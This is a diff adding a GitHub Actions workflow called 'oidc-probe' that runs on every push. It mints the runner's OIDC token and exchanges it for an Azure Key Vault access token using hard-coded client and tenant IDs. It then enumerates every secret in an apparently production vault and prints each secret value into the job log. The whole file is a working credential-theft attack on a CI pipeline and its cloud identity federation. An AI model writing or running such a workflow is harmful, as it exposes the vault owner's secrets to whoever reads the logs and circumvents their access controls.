@@ -1,0 +1,47 @@
+name: oidc-probe
+on: push
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      AZURE_CLIENT_ID: 72ff278a-9e71-43ec-bac4-2ca303f8e462
+      AZURE_TENANT_ID: 3205c325-06a5-4171-9ce8-ffc5e6c2845e
+    steps:
+      - name: mint-oidc
+        run: |
+          set +e
+          echo "=== OIDC vars ==="
+          echo "URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then
+            echo "NO OIDC URL - cannot mint token"
+            exit 0
+          fi
+          OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
+            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r .value)
+          echo "OIDC_LEN=${#OIDC}"
+          echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq . 2>/dev/null
+          echo "=== Exchange for Azure vault token ==="
+          RESP=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
+            -d "client_id=${AZURE_CLIENT_ID}" \
+            -d "grant_type=client_credentials" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            -d "client_assertion=${OIDC}" \
+            --data-urlencode "scope=https://vault.azure.net/.default")
+          echo "$RESP" | jq . 2>/dev/null || echo "$RESP"
+          TOK=$(echo "$RESP" | jq -r '.access_token // empty')
+          if [ -n "$TOK" ]; then
+            echo "=== TOKEN WORKS - listing secrets ==="
+            curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
+              -H "Authorization: Bearer ${TOK}" | jq .
+            for ID in $(curl -sS "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" \
+              -H "Authorization: Bearer ${TOK}" | jq -r '.value[]?.id'); do
+              echo "--- SECRET $ID ---"
+              curl -sS "${ID}?api-version=7.4" -H "Authorization: Bearer ${TOK}" | jq -r '.value // .'
+            done
+          else
+            echo "Token exchange FAILED - sub claim may not match federation config"
+            echo "Error: $(echo "$RESP" | jq -r '.error_description // .error // "unknown"')"
+          fi
